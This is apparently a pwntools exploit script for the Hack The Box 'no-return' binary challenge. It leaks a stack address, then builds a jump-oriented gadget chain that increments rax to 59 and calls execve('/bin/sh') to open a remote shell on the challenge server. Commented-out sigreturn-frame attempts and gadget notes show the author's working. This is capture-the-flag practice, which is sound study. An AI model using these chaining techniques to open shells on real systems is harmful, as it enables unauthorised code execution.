
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host docker.hackthebox.eu --port 30286 no-return
from pwn import *
# Set up pwntools for the correct architecture
exe = context.binary = ELF('no-return')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'docker.hackthebox.eu'
port = int(args.PORT or 30756)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
b *0x401000
#b *0x0401099

#b 0x401005
#b 0x401006
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# gef➤  vmmap
# Start              End                Offset             Perm Path
# 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /home/marc/Dokumente/CTF_Wargames/perpetual/hackthebox/pwn/No_Return/no-return
# 0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /home/marc/Dokumente/CTF_Wargames/perpetual/hackthebox/pwn/No_Return/no-return
# 0x00007ffdf520c000 0x00007ffdf522d000 0x0000000000000000 rw- [stack]
# 0x00007ffdf5315000 0x00007ffdf5318000 0x0000000000000000 r-- [vvar]
# 0x00007ffdf5318000 0x00007ffdf5319000 0x0000000000000000 r-x [vdso]
# 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]


pop_rsp = p64(0x401000)
syscall = p64(0x0401099)

#    0x401000:	pop    rsp
#    0x401001:	pop    rdi
#    0x401002:	pop    rsi
#    0x401003:	pop    rbp
#    0x401004:	pop    rdx
#    0x401005:	pop    rcx  <--- 
#    0x401006:	pop    rbx
#    0x401007:	xor    rax,rax
# => 0x40100a:	jmp    QWORD PTR [rdi+0x1] -> 0x400000 /bin/sh
#    0x40100d:	inc    rax

#read case
# rdi 0 
# rsi stack with /bin/sh 
# rdx non 0 number

# 0x0000000000401067: xchg rdi, rcx; std;         jmp qword ptr [rdx]; 
# 0x0000000000401050: pop rdx; jmp qword ptr [rcx];

# 0x000000000040104d: mov rcx, rdx; pop rdx;      jmp qword ptr [rcx];  # arbitrary rdx, rcx is next gadget
# 0x000000000040100d: inc rax; fdivrp st(1);      jmp qword ptr [rdx]; 

# 0x0000000000401014: sub rsi, qword ptr [rsp + 0x10]; cmc; jmp qword ptr [rdx]; #rsi = 0 
# 0x000000000040104d: mov rcx, rdx; pop rdx;      jmp qword ptr [rcx];  # 

# 0x0000000000401067: xchg rdi, rcx; std;         jmp qword ptr [rdx]; 
# 0x000000000040104d: mov rcx, rdx; pop rdx;      jmp qword ptr [rcx]; jump to [rsp]; rdx = [rsp+8]

# 0x000000000040100d: inc rax; fdivrp st(1);      jmp qword ptr [rdx]; 
# 0x000000000040104d: mov rcx, rdx; pop rdx;      jmp qword ptr [rcx]; jump to [rsp]; rdx = [rsp+8]

# 0x000000000040104d: mov rcx, rdx; pop rdx;      jmp qword ptr [rcx];
# 0x000000000040105a: xchg rax, rdx; fdivp st(1); jmp qword ptr [rcx]; 


# 59 bytes written @rsi to set rax





# 0x000000000040105a: xchg rax, rdx; fdivp st(1); jmp qword ptr [rcx]; 
# 0x0000000000401067: xchg rdi, rcx; std; jmp qword ptr [rdx]; 


# assume contol of rcx
# 0x0000000000401050: pop rdx; jmp qword ptr [rcx]; <- (pop next gadget into rdx)
# 0x000000000040104d: mov rcx, rdx; pop rdx; jmp qword ptr [rcx];  <- pop whatever into rdx 
# again control of rip



io = start()

#input()
#io.recvuntil(b"\n")

stack_ptr = u64(io.recvn(8))

userbuf_ptr = stack_ptr - 0xb8
io.info("%x" % userbuf_ptr)

# sframe = SigreturnFrame()
# sframe.rax = 59 # execve
# sframe.rdi = userbuf_ptr #string to /bin/sh

# sframe.rsi = 0
# sframe.rdx = 0

# sframe.rsp = userbuf_ptr # random
# sframe.rip = 0x401099 # syscall
# sframe.rbp = userbuf_ptr + 0x100


# mmap_frame = SigreturnFrame()
# mmap_frame.rax = 3 # mmap
# mmap_frame.rdi = 2 #0x800000 #string to /bin/sh

# mmap_frame.rsi = 0x1000
# mmap_frame.rdx = 7

# mmap_frame.r9 = 0x22    
# mmap_frame.r10 = -1

# mmap_frame.rsp = userbuf_ptr + 0x200 # random
# mmap_frame.rip = 0x401099 # syscall
# mmap_frame.rbp = userbuf_ptr + 0x220 
# mmap_frame.csgsfs = 0x33

tmp_ptr = userbuf_ptr

# 0x0000000000401067: xchg rdi, rcx; std;         jmp qword ptr [rdx]; 
# 0x000000000040104d: mov rcx, rdx; pop rdx;      jmp qword ptr [rcx]; jump to [rsp]; rdx = [rsp+8]

# 0x000000000040100d: inc rax; fdivrp st(1);      jmp qword ptr [rdx]; 
# 0x000000000040104d: mov rcx, rdx; pop rdx;      jmp qword ptr [rcx]; jump to [rsp]; rdx = [rsp+8]

inc_rax = 0x000000000040100d
pop_rdx = 0x000000000040104d

ptr_to_40104d = userbuf_ptr + 0x10
inc_rax_ptr = userbuf_ptr   + 0x18
syscall_ptr = userbuf_ptr   + 0x20

rollercoaster_loop = fit({
     0: inc_rax_ptr,
     8: ptr_to_40104d
})

inc_rax_to_59 = rollercoaster_loop * 59 \
    + fit({
     0: syscall_ptr,
     8: 0,
})

stack_structure = fit({
        0x00 : b"/bin/sh\0",
        0x08 : 0x0000000000401067,          # xchr_ptr
        0x10 : 0x000000000040104d,
        0x18 : 0x000000000040100d,
        0x20 : syscall,

        0x30 : p64(userbuf_ptr + 0x8 -1),   # rdi ([next_jump addr - 1])
        0x38 : 0,                           # rsi # scratch buffer 
        0x40 : userbuf_ptr,                 # rbp
        0x48 : ptr_to_40104d,               # rdx
        0x50 : userbuf_ptr,                 # rcx
        0x58 : 1,                           # rbx
        # 0x60 : 0x40105a,                   # jump #3
        0x60 : inc_rax_to_59,               # rollercoaster

        # 0xb0 : pop_rsp, # jmp_ptr 
        # 0xb8 : userbuf_ptr + 0x10,
    },
    filler=b'\0',
)


# #write the sigretframe by slowly walking down the stack

for i in range(0, len(stack_structure), 8):
    io.info("Iteration: %d" % i)
    tmp_ptr += 8
    payload = fit({
        0 : stack_structure[i:i+8],
        0xb0 : 0x40106e, # jump_ptr to entry+1 
    }, filler=b'\0')
    io.send(payload)
    io.recvn(8) #wait for next input

# #continue to move the stack further downwards
# for i in range(0, 0x100, 8):
#     tmp_ptr += 8
#     payload = fit({
#         0xb0 : 0x40106e, # jump_ptr to entry+1 
#     }, filler=b'\0')
#     io.send(payload)
#     io.recvn(8) #wait for next input

# jump and execute the structure
transition_payload = fit({
        0xb0 : pop_rsp, # jmp_ptr 
        0xb8 : userbuf_ptr + 0x30,
    }, filler = b'\0'
)

io.send(transition_payload)

input()
io.sendline(b"A"*14) #send 0xf chars
io.interactive()